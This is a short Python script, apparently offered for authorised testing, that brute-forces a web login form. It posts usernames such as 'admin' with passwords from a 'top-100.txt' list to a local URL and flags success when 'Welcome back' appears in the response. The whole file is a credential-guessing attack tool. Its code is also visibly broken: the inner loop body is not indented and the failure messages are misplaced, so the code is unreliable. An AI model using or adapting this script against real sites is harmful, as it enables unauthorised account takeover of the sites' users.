# Use it on a web application that are authorised to test 

import requests
import sys

target="http://127.0.0.1:5000"
usernames=["admin","user","test"]
passwords="top-100.txt" 
needle="Welcome back"

for username in usernames:
    with open(passwords,"r") as passwords_list:
        for password in passwords_list:
        password=password.strip("\n").encode()
        sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username,password.decode()))
        r=requests.post(target,data={"username":username,"password":password})
        if needle.encode() in r.content:
            sys.stdout.write("\n")
            sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
            sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for '{}'!".format(username))
        sys.stdout.write("\n")
        
